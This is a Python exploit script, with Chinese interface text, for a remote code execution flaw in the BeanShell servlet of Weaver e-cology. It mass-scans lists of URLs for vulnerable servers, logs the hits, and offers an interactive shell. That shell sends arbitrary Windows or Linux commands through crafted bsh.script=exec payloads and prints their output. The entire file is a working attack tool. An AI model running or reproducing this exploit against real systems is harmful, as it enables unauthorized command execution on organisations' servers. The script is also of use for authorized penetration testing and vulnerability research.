#-*- coding:utf-8 -*-
import requests
import re
import sys
import os
import warnings
warnings.filterwarnings("ignore")



def title():
    print('+-------------------------------------------------------')
    print('+     \033[34mVersion:  泛微 e-cology BeanShell 组件远程代码执行    \033[0m')
    print('+     \033[36m使用格式:	python3 poc.py -u url    \033[0m')
    print('+     \033[36m  	python3 poc.py -f file           \033[0m')
    print('+     \033[36m  	python3 poc.py -e url （单个url命令执行）          \033[0m')
    print('+     \033[31m                                  Python By Stanke \033[0m')
    print('+-------------------------------------------------------')


def result_write(msg):
	file_path = os.getcwd() + '/result.txt'
	file = open(file_path, 'a')
	file.write(msg)
	file.write('\n')
	file.close()		

def wrong_write(msg):
	file_path = os.getcwd() + '/requests_error.txt'
	file = open(file_path, 'a')
	file.write(msg)
	file.write('\n')
	file.close()


def verify(url):
	all_url = url + "/weaver/bsh.servlet.BshServlet"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	try:
		response = requests.get(url = all_url,headers = headers,verify = False,timeout = 5)
		if response.status_code != 200:
			print("\033[31m[x] %s 		不存在BeanShell组件远程代码执行漏洞\033[0m" % format(url,"<30"))
		else:
			try:
				playload = 'bsh.script=print("Penetration test")'
				post_response = requests.post(url = all_url,data = playload,headers = headers,verify = False,timeout = 5)
				result = post_response.text
				if "Penetration test" in result:
					print("\033[32m[x] %s 		存在BeanShell组件远程代码执行漏洞\033[0m" % format(url,"<30"))
					result_write(all_url)
				else:
					print("\033[31m[x] %s 		不存在BeanShell组件远程代码执行漏洞\033[0m" % format(url,"<30"))
			except Exception as e:
				wrong_write(url)
				print("\033[33m[x]%s 		requests error\033[0m" % format(url,"<30"))
	except Exception as e:
		wrong_write(url)
		print("\033[33m[x]%s 		requests error\033[0m" % format(url,"<30"))

def get_result(html):
	pattern = re.compile(r'<pre>(.*?)</pre>',re.S)
	result = pattern.findall(html)
	return result

def input_exec(url):
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	test_playload = 'bsh.script=exec("ls /tmp")'
	response = requests.post(url = url,data = test_playload,headers = headers,verify = False,timeout = 5)
	test_result = get_result(response.text)
	if len(test_result) == 0:
		while True:
			exec_get = input("\033[36m[+] Input Win Exec: \033[0m")
			if exec_get == "Q" or exec_get == "q":
				break
			else:
				playload = 'bsh.script=exec("cmd.exe /c %s")' % exec_get
				try:
					response = requests.post(url = url,data = playload,headers = headers,verify = False,timeout = 5)
					result = get_result(response.text)
					win_result = result[0].strip()
					if win_result == "":
						print("\033[34m[+]\t\t\t\t\tSUCCESS\033[0m")
					else:
						print("\033[32m %s \033[0m" % win_result)
				except Exception as e:
					print("\033[31m[x]\t\t\t\t\t命令输入错误\033[0m")
	else:
		while True:
			exec_get = input("\033[36m[+] Input Linux Exec: \033[0m")
			if exec_get == "Q" or exec_get == "q":
				break
			else:
				playload = 'bsh.script=exec("%s")' % exec_get
				try:
					response = requests.post(url = url,data = playload,headers = headers,verify = False,timeout = 5)
					result = get_result(response.text)
					linux_result = result[0].strip()
					if linux_result == "":
						print("\033[34m[+]\t\t\t\t\tSUCCESS\033[0m")
					else:
						print("\033[32m %s \033[0m" % linux_result)
				except Exception as e:
					print("\033[31m[x]\t\t\t\t\t命令输入错误\033[0m")
			
def try_exec(url):
	all_url = url + "/weaver/bsh.servlet.BshServlet"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	}
	try:
		response = requests.get(url = all_url,headers = headers,verify = False,timeout = 5)
		if response.status_code != 200:
			print("\033[31m[x] %s 		不存在BeanShell组件远程代码执行漏洞\033[0m" % format(url,"<30"))
		else:
			try:
				playload = 'bsh.script=print("Penetration test")'
				post_response = requests.post(url = all_url,data = playload,headers = headers,verify = False,timeout = 5)
				result = post_response.text
				if "Penetration test" in result:
					input_exec(all_url)
				else:
					print("\033[31m[x] %s 		不存在BeanShell组件远程代码执行漏洞\033[0m" % format(url,"<30"))
			except Exception as e:
				print("\033[33m[x]%s 		requests error\033[0m" % format(url,"<30"))
	except Exception as e:
		print("\033[33m[x]%s 		requests error\033[0m" % format(url,"<30"))

def read_file(file_name):
	with open(file_name, 'r') as f:
		lines = f.readlines()
		for line in lines:
			line = line.strip()
			verify(line)


if __name__ == '__main__':
	title()
	if len(sys.argv) == 3:
		if sys.argv[1] == "-u":
			verify(sys.argv[2])
		elif sys.argv[1] == "-f":
			read_file(sys.argv[2])
		elif sys.argv[1] == "-e":
			try_exec(sys.argv[2])
		else:
			print('     \033[31m           未输入正确格式参数    \033[0m')
	else:
		 print('     \033[31m           参数格式错误            \033[0m')





